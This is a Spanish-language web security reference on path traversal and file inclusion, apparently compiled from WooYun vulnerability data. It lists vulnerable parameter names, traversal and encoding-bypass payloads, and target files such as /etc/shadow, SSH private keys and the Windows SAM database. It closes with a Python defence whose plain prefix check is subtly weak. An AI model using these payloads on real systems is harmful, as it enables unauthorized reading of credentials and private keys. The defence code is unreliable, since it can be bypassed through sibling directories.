# Seguridad Web - Traversal de archivos e inclusión de archivos

> Fuente: Base de datos de vulnerabilidades WooYun | Extraído de web-file-infra.md

## II. Traversal de archivos e inclusión de archivos

### 2.1 Naturaleza de la vulnerabilidad

```
Espacio de entrada del usuario -> [Fallo del límite de confianza] -> Espacio del sistema de archivos
Núcleo: el desarrollador asume que "entrada del usuario = nombre de archivo", el atacante lo explota como "entrada del usuario = instrucción de ruta"
```

### 2.2 Identificación de parámetros vulnerables

Nombres de parámetros frecuentes (por frecuencia de aparición):

```
Tipo archivo: filename, filepath, path, file, filePath, hdfile, inputFile
Tipo descarga: download, down, attachment, attach, doc
Tipo lectura: read, load, get, fetch, open, input
Tipo plantilla: template, tpl, page, include, temp
Tipo genérico: url, src, dir, folder, resource, name
```

Puntos funcionales de alto riesgo (TOP 5):
1. Interfaz de descarga de archivos (27 veces) - `down.php, download.jsp`
2. Función de vista previa de archivos (17 veces) - `view.php, preview.jsp`
3. Gestión de adjuntos (6 veces) - `attachment.php`
4. Carga de imágenes (5 veces) - `pic.php, image.jsp`
5. Visualización de logs (4 veces) - `log.php, viewlog.jsp`

### 2.3 Payloads de traversal de directorios

Traversal básico:

```bash
../                          # Estándar Linux
..\..\                       # Estándar Windows
../../../../../../../etc/passwd
..\..\..\..\..\..\windows\win.ini
```

Bypass mediante codificación:

```bash
# Codificación URL simple
%2e%2e%2f  |  %2e%2e%5c  |  ..%2f  |  %2e%2e/

# Doble codificación URL
%252e%252e%252f  |  ..%252f

# Codificación Unicode/UTF-8 sobrelarga (específico de GlassFish)
%c0%ae%c0%ae/%c0%af

# Codificación mixta
..%2f  |  %2e%2e/  |  ..%c0%af
```

Bypass especial:

```bash
# Truncamiento con byte nulo (PHP<5.3.4 / versiones antiguas de Java)
../../../etc/passwd%00.jpg

# Truncamiento con signo de interrogación
../../../WEB-INF/web.xml%3f

# Ofuscación de ruta
....//  |  ....\/  |  ..\/  |  ./../../

# Ruta absoluta/bypass de protocolo
/etc/passwd
file:///etc/passwd
file://localhost/etc/passwd
```

### 2.4 Tabla de referencia rápida de rutas de archivos sensibles

Sistema Linux:

```bash
/etc/passwd                    # Lista de usuarios (opción preferida de verificación)
/etc/shadow                    # Hashes de contraseñas
/etc/hosts                     # Mapeo de hosts
/root/.ssh/id_rsa              # Clave privada SSH
/root/.bash_history            # Historial de comandos
/proc/self/environ             # Variables de entorno del proceso
/etc/nginx/nginx.conf          # Configuración de Nginx
/etc/my.cnf                    # Configuración de MySQL
```

Sistema Windows:

```bash
C:\windows\win.ini             # Configuración del sistema (opción preferida de verificación)
C:\boot.ini                    # Configuración de arranque (XP/2003)
C:\inetpub\wwwroot\web.config  # Configuración de aplicación IIS
C:\windows\system32\config\sam # Base de datos SAM
```

Java Web:

```bash
WEB-INF/web.xml                         # Configuración central (opción preferida de verificación)
WEB-INF/classes/jdbc.properties          # Configuración de base de datos
WEB-INF/classes/applicationContext.xml   # Configuración de Spring
WEB-INF/classes/hibernate.cfg.xml        # Configuración de Hibernate
```

Aplicación PHP:

```bash
config.php | config.inc.php | db.php | conn.php    # Configuración genérica
wp-config.php                           # WordPress
config_global.php | config_ucenter.php  # Discuz
application/config/database.php         # CodeIgniter
```

ASP.NET:

```bash
web.config                 # Configuración central (incluye cadena de conexión)
../web.config              # Configuración del directorio superior
```

### 2.5 Medidas de defensa

```python
import os
def safe_file_access(user_input, base_dir):
    # 1. Normalización de la ruta
    full_path = os.path.normpath(os.path.join(base_dir, user_input))
    # 2. Verificar que esté dentro del directorio permitido
    if not full_path.startswith(os.path.normpath(base_dir)):
        raise SecurityError("Path traversal detected")
    # 3. Extensiones de lista blanca
    # 4. Verificar la existencia del archivo
    return full_path
```

Principio clave: normalización de ruta (realpath/normpath) -> verificación del límite de directorio -> validación por lista blanca -> ejecución con privilegios mínimos

---

